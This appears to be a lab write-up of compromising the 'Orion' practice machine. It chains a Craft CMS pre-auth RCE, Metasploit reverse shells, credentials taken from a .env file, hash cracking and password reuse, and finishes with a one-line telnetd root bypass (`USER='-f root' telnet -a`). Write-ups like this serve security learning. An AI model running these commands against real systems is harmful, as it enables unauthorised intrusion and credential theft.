@@ -1,0 +1,124 @@
+import Bild from "../../components/Bild.astro";
+import Code from "../../components/Code.astro";
+import Block from "../../components/Block.astro";
+import Marker from "../../components/Marker.astro";
+
+**Disclaimer**: The steps for this writeup are based on my notes and memory, so they might not be 100% accurate. Additionally, I have changed the flags for this writeup, so they won't match the ones on the machine.
+
+Starting with a full TCP port scan and then running service detection against the discovered ports reveals two open ports:
+
+<Block
+  language="Text"
+  content={"22/tcp\t- SSH (OpenSSH 8.9p1 Ubuntu)\n80/tcp\t- HTTP (nginx 1.18.0)"}
+/>
+
+The web server hosts a website called Orion Telecom. Since neither service immediately reveals an obvious entry point, I started enumerating the web application.
+
+<Bild
+    src="/images/writeups/orion-webpage.png"
+    alt="Orion Telcom webpage"
+    width={1686}
+    height={908}
+/>
+
+Using `ffuf`, I discovered the following endpoints:
+
+<Block language="Text" content={"assets\nlogout\nadmin"} />
+
+The `/admin` endpoint led me to investigate the application's backend. Further enumeration revealed that the website was running Craft CMS version 5.6.16.
+
+<Bild
+    src="/images/writeups/orion-login.png"
+    alt="CraftCMS login page"
+    width={1162}
+    height={979}
+/>
+
+I searched for vulnerabilities affecting this version and found a pre-authentication remote code execution vulnerability tracked as <Marker content="CVE-2025-32432" link="[https://nvd.nist.gov/vuln/search/results?query=CVE-2025-32432](https://nvd.nist.gov/vuln/search/results?query=CVE-2025-32432)" />. A proof of concept was available that could execute commands through the vulnerable asset-transform functionality.
+
+I first tried a custom reverse-shell payload. I encoded the command in Base64 and passed it to the exploit, which decoded the command and piped it into Bash:
+
+<Block
+language="Bash"
+content={
+"python3 exploit.py -u http://orion.htb -c \"echo '<BASE64_PAYLOAD>' | base64 -d | bash\""
+}
+/>
+
+However, the reverse shell did not remain interactive. Bash reported that it could not set the terminal process group and had no job control, before exiting with a `No such file or directory` error. This initially made it unclear whether the command execution itself was working correctly.
+
+I then tried the exploit through Metasploit using the `linux/http/craftcms_preauth_rce_cve_2025_32432` module. The module successfully identified the target as vulnerable and leaked the PHP session storage path, `/var/lib/php/sessions`. However, the default `php/meterpreter/reverse_tcp` payload repeatedly failed to establish a stable session.
+
+After checking the VPN routing and capturing the callback traffic, I stopped investigating the network configuration and changed the payload to `php/unix/reverse_bash`. This worked, giving me a reverse shell on the target.
+
+With a shell on the machine, I began enumerating the application files. The `.env` file in `/var/www/html/craft` immediately caught my attention because it contained the database configuration:
+
+<Block
+  language="Bash"
+  content={
+    "CRAFT_DB_DRIVER=mysql\nCRAFT_DB_SERVER=127.0.0.1\nCRAFT_DB_PORT=3306\nCRAFT_DB_DATABASE=orion\nCRAFT_DB_USER=root\nCRAFT_DB_PASSWORD=SuperSecureCraft123Pass!"
+  }
+/>
+
+The file also disclosed the Craft CMS security key and showed that development mode and administrative changes were enabled. For the next step, however, the database credentials were the most interesting finding.
+
+I tried connecting to MySQL using the root credentials:
+
+<Block language="Bash" content={"mysql -u root -p orion"} />
+
+The command initially appeared to hang. My reverse shell was not providing a proper interactive terminal, which made interacting with programs such as MySQL difficult. I eventually used `script` to obtain a TTY, after which the MySQL client worked as expected.
+
+I queried the `users` table:
+
+<Block language="SQL" content={"SELECT * FROM users;"} />
+
+The table contained an administrator account with the email address `adam@orion.htb`. Its password field contained a bcrypt hash:
+
+<Block
+  language="Text"
+  content={"$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS"}
+/>
+
+I copied the hash to my attacking machine and used Hashcat with `rockyou.txt` to crack it. The recovered password was:
+
+<Block
+  language="Text"
+  content={"[adam@orion.htb](mailto:adam@orion.htb) : darkangel"}
+/>
+
+Although the database listed the account's username as `admin`, the recovered credentials worked for the Linux user `adam`. I could now establish a proper SSH session instead of relying on the limited reverse shell.
+
+<Block
+  language="Bash"
+  content={"ssh [adam@orion.htb](mailto:adam@orion.htb)"}
+/>
+
+With SSH access, I continued enumerating the host for privilege-escalation opportunities. I checked listening TCP sockets and running processes:
+
+<Block language="Bash" content={"ss -tlnp\nps aux"} />
+
+One finding stood out: a Telnet service was listening on localhost, on port 23. Since the service was only available locally, it was not directly exposed through the machine's external network interface, but I could reach it from my SSH session.
+
+I checked the Telnet version and found GNU Inetutils Telnet 2.7. While investigating potential vulnerabilities, I came across a buffer-overflow issue in the LINEMODE SLC handler, tracked as <Marker content="CVE-2026-32746" link="[https://nvd.nist.gov/vuln/detail/CVE-2026-32746](https://nvd.nist.gov/vuln/detail/CVE-2026-32746)" />. However, that was not the vulnerability used for the final escalation.
+
+The relevant finding was a separate authentication bypass in `telnetd`, tracked as <Marker content="CVE-2026-24061" link="[https://nvd.nist.gov/vuln/detail/CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)" />. The vulnerable service failed to sanitize the `USER` environment variable before passing it to the system's `login` program. By supplying `-f root` as the username and enabling automatic login in the Telnet client, the argument could be interpreted as an option to `login` rather than as a normal username.
+
+The important detail was the `-a` option. Setting the `USER` environment variable locally was not sufficient by itself; the Telnet client also needed to send it to the server.
+
+I used the following command from my SSH session as `adam`:
+
+<Block language="Bash" content={"USER='-f root' telnet -a localhost 23"} />
+
+This successfully bypassed the normal authentication process and provided a root shell. The machine was fully compromised.
+
+**A vulnerable service can be more useful locally than remotely**: The Telnet service was bound to localhost, but that did not make it harmless. Once I obtained SSH access, I could interact with the service from the target itself.
+
+**Configuration files can expose credentials for other services**: The Craft CMS `.env` file contained the MySQL root password. Rather than trying to exploit another web vulnerability, I used the available credentials to enumerate the database and discover a password hash.
+
+**Password reuse can turn database access into an SSH foothold**: Cracking the administrator's bcrypt hash revealed a password that worked for the Linux user `adam`. This turned command execution through the web application into a stable SSH session.
+
+**A shell is not necessarily a proper terminal**: The initial reverse shell could execute commands but struggled with interactive applications. Using `script` to obtain a TTY made the MySQL client usable. The distinction between command execution and an interactive terminal is worth understanding when troubleshooting reverse shells.
+
+**Check the exact vulnerability, not just the affected software version**: GNU Inetutils 2.7 was associated with multiple vulnerabilities. The successful `USER='-f root'` technique exploited the authentication bypass in CVE-2026-24061, not the separate LINEMODE SLC out-of-bounds write in CVE-2026-32746.
+
+**The overall path was a chain of relatively small discoveries**: Craft CMS provided the initial foothold, the `.env` file exposed database credentials, the database revealed a crackable password hash, and SSH enabled local enumeration. The final privilege escalation came from a vulnerable Telnet service that was accessible only from the host itself.
